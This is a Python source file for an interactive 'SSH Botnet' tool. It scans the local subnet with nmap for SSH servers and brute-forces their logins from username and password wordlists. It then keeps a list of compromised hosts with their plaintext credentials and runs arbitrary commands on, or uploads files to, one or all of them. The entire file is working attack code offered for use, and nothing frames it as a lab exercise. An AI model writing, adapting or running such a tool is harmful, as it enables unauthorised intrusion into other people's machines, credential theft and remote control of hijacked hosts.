import os
import nmap
from termcolor import colored
from botnet import Botnet
import time

botnet = Botnet()

def scan_ssh_ips(myip):
    nm = nmap.PortScanner()

    print("\n[*] Scanning network for ssh servers ...")
    nm.scan(myip + '/24')
    print("[+] Scan complete\n")

    hosts = list(nm.all_hosts())
    hosts.remove(myip)

    if not hosts:
        print("[-] No live hosts other than you found on this network")
        return {}

    ssh_servers = {}
    for i in hosts:
        open_ports = list(nm[i].get('tcp', {}).keys())
        for j in open_ports:
            if nm[i]['tcp'][j]['name'] == 'ssh':
                port = j
                ssh_servers[i] = j
                break
            port = -1

    if not ssh_servers:
        print("[-] No hosts use SSH protocol!!!")

    return ssh_servers

def get_ssh_servers():
    interface=input("Write the interface you want to scan ex (eth0 or Vmnet8 or vboxnet0 or Wi-Fi): ")

    # Linux
    if os.name == 'posix':
        myip = os.popen("ifconfig " + interface + " | grep \"inet \" | awk \'{print $2}\'").read().replace("\n", "")
    # Window
    elif os.name == 'nt':
        output = os.popen("ipconfig").read()
        myip = output[output.index(interface):].split("IPv4 Address")[1].split(": ")[1].split("\n")[0]

    ssh_servers = scan_ssh_ips(myip)

    return ssh_servers
    

def list_ssh_servers(ssh_servers):
    print("Running ssh servers : ")
    
    with open('session.txt', 'w') as f2:
        for i, j in ssh_servers.items():
            print("Host : " + i + "\t\t" + "port : " + str(j))
            f2.write(i + ":" + str(j) + '\n')
    print('\n')

def get_usernames(fileName):
    usernames = []
    with open(fileName, "r") as file:
        for line in file:
            usernames.append(line.strip())
    return usernames

def get_passwords(fileName):
    passwords = []
    with open(fileName, "r") as file:
        for line in file:
            passwords.append(line.strip())
    return passwords

def try_dictionary(ssh_servers):
    usernames = get_passwords('username_wordlist.txt')
    passwords = get_passwords('passwd_wordlist.txt')
    retry_delay = 30
    for i, j in ssh_servers.items():
        for username in usernames:
            found_username = None
            found_password = None
            print("(++)Try username: " + username)
            k = 0
            while k < len(passwords):
                password = passwords[k].strip()
                print(f"(+) Try password: {password}")
                
                result = botnet.addBot(i, username, password, j)
                if result == True:
                    found_username = username
                    found_password = password
                    break
                elif isinstance(result, Exception):
                    print(f"Error: {result}. Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                    k -= 1
                k += 1
            if found_password is not None:
                print("*_* Found successful password: " + found_password + " .for username : " + found_username)
                break


def list_bosts():
    global botnet
    bot_count = len(botnet.bots)
    print('''
+--------------+
| List of bots |
+--------------+
          ''')
    i = 1
    for bot in botnet.bots:
            print(f'''       |
        +---> Bot {[i]}: IP:{bot.host} USER:{bot.user} PASS={bot.password}''')
            i += 1

    print(f'\nNumber Of Bots: {bot_count}')

    return bot_count

def bot_collect():
    while 1:
        ssh_servers = get_ssh_servers()
        if ssh_servers:
            list_ssh_servers(ssh_servers)
        else:
            break

        choice = input("Continue adding bots to the botnet?[Y/n] ")
        print("\n")
        if choice.lower() in ["n", "no"]:
            break
        else:
            try_dictionary(ssh_servers)
            list(set(botnet.bots))
            list_bosts()
            break

def command_execution():
    option=int(input('''
                +---------------------------------------------+
                |                                             |
                |  1) Execute a commnand in a single bot      |
                |                                             |
                |  2) Execute the commnand in all your bots   |
                |                                             |
                +---------------------------------------------+

Select the option: '''))
        
    if option==1:
        list_bosts()
        while 1:
            bot_index=int(input("\nSelect the number of the bot: "))
            bot=botnet.select_bot(bot_index)
            print(bot)
            if bot:
                break
        while 1:
            command = input(colored(f'{bot.user}@{bot.host}:~$ ', 'red', None, ['bold']))
            botnet.command_single_bot(command, bot)
            if command == "exit()" or command == "exit":
                print("\n[*] History of commands stored in logs.txt")
                break

    if option==2:
        list_bosts()
        while 1:
            command = input(colored('ssh@botnet:~$ ', 'red', None, ['bold']))
            botnet.command_all_bots(command)
            if command == "exit()" or command == "exit":
                print("\n[*] History of commands stored in logs.txt")
                break

        

def file_upload():
    option=int(input('''
                +---------------------------------------------+
                |                                             |
                |  1) Upload a file to a single bot           |
                |                                             |
                |  2) Upload a file to all your bots          |
                |                                             |
                +---------------------------------------------+

Select the option: '''))
    
    if option==1:
        list_bosts()
        while 1:
            bot_index=int(input("\nSelect the number of the bot: "))
            bot=botnet.select_bot(bot_index)
            if bot:
                break
        localpath=input("Write the LOCAL path file ex( /home/user/program.exe or C://User/file.txt ): ")
        remotepath=input("Write the REMOTE path file ex( /tmp/yourfile.sh or /home/car.jpg ): ")
        botnet.up_file_single_bot(bot, localpath, remotepath)

    if option==2:
        list_bosts()
        localpath=input("Write the LOCAL path file ex( /home/user/program.exe or C://User/file.txt ): ")
        remotepath=input("Write the REMOTE path file ex( /tmp/yourfile.sh or /home/car.jpg ): ")
        botnet.up_file_all_bots(localpath, remotepath)

if __name__ == "__main__":

    while 1:

        option=int(input('''

███████╗███████╗██╗  ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗
██╔════╝██╔════╝██║  ██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝
███████╗███████╗███████║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   
╚════██║╚════██║██╔══██║    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   
███████║███████║██║  ██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   
╚══════╝╚══════╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                                                                 
           +------------------------------------------------------+
           |                                                      |
           |                  1) Bot Collect                      |
           |                                                      |
           |                  2) Command Execution                |
           |                                                      |
           |                  3) File Upload                      |
           |                                                      |
           |                  4) Bots List                        |
           |                                                      |
           |                  5) Exit                             |
           |                                                      |
           +------------------------------------------------------+

Select the option: '''))

        if option==1:
            bot_collect()
        if option==2:
            command_execution()
        if option==3:
            file_upload()
        if option==4:
            list_bosts()
        if option==5:
            exit()
        input('Enter to continue ...')